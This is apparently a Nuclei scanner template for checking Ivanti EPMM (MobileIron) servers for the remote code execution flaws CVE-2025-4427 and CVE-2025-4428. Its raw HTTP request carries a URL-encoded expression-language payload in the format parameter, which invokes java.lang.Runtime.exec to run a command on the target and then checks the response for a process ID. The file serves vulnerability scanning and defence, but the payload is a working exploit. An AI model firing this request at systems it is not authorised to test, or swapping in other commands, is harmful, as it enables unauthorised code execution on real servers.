id: ivanti-epmm-rce-cve-2025-4427

info:
  name: Ivanti EPMM RCE (cve-2025-4427-and-cve-2025-4428)
  author: shaikhyaser,yaser_s
  severity: critical
  description: |
    This template detects a Remote Code Execution (RCE) vulnerability in Ivanti EPMM (MobileIron). The vulnerability is triggered by injecting a payload and observing the response containing a process ID.
  reference: 
    - https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/ 
    - https://github.com/watchtowrlabs/watchTowr-vs-Ivanti-EPMM-CVE-2025-4427-CVE-2025-4428/blob/main/watchTowr-vs-Ivanti-EPMM-CVE-2025-4427-CVE-2025-4428.py
  tags: rce,mobileiron,ivanti,epmm

http:
  - raw:
      - |
        GET /mifs/rs/api/v2/featureusage?format=%24%7b%22%22%2e%67%65%74%43%6c%61%73%73%28%29%2e%66%6f%72%4e%61%6d%65%28%27%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%27%29%2e%67%65%74%4d%65%74%68%6f%64%28%27%67%65%74%52%75%6e%74%69%6d%65%27%29%2e%69%6e%76%6f%6b%65%28%6e%75%6c%6c%29%2e%65%78%65%63%28%27%69%64%27%29%7d HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Process[pid"

      - type: status
        status:
          - 400
